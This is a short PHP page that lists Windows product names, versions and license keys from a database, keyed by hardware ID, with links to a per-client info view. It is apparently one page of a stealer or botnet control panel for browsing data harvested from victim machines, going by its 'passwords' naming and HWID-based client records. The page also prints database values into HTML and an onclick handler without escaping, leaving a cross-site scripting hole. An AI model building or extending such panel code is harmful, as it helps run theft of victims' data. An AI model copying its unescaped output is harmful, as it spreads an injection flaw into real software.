<?php 
	if(!isset($initialized))
	{
		include('../../pages/404.php');
	}
	
	$query = "SELECT * FROM win_license";
	
	try 
	{ 
		// Execute the query against the database 
		$stmt = $db->prepare($query); 
		$result = $stmt->execute(); 
	} 
	catch(PDOException $ex) 
	{ 
		DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); // Will print debug message and stop the script execution by calling die();
	} 
	$rows_passwords = $stmt->fetchAll();
?>
<div class="row">
	<div class="col-lg-12">
		<table id="password_table" class="table table-bordered table-striped table-hover">
			<thead>
				<tr>
					<th>HWID</th>
					<th>Product Name</th>
					<th>Version</th>
					<th>Product License</th>
				</tr>
			</thead>
			<tbody>
				<?php foreach($rows_passwords as $row_password):?>
				<tr>
					<td><a href="javascript:void(0)" data-toggle="modal" data-target="#client_info" onclick="LoadClientInfo('<?php echo $row_password['hwid']; ?>')"><?php echo $row_password['hwid']; ?></a></td>
					<td><?php echo $row_password['product']; ?></td>
					<td><?php echo $row_password['version']; ?></td>
					<td><?php echo $row_password['license']; ?></td>
				</tr>
				<?php endforeach ?>
			</tbody>
		</table>
	</div>
</div>
